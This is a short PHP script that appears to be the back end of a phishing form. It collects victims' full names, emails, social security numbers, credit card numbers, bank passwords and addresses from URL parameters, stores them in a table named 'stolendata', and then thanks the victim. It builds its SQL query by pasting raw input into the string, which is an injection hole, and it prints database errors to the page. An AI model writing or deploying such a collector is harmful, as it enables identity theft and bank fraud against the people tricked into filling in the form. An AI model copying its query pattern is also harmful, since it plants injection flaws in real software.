<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "iphoneform";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) { 
    die('Connection Failure:' . $conn->connect_error);
}

$fullname = $_GET["fullname"];
$email = $_GET["email"];
$ssn = $_GET["ssn"];
$ccn = $_GET["ccn"];
$ibp = $_GET["bankpass"];
$address = $_GET["address"];

$sql = "INSERT INTO stolendata (fullname, email, ssn, ccn, ibp, adddress) VALUES ('$fullname', '$email', '$ssn', '$ccn', '$ibp', '$address')";

if(mysqli_query($conn, $sql)){
    echo("Thank you for your details!");
} else {
    echo("Error" . $sql . "<br>" . mysqli_error($conn));
}
?>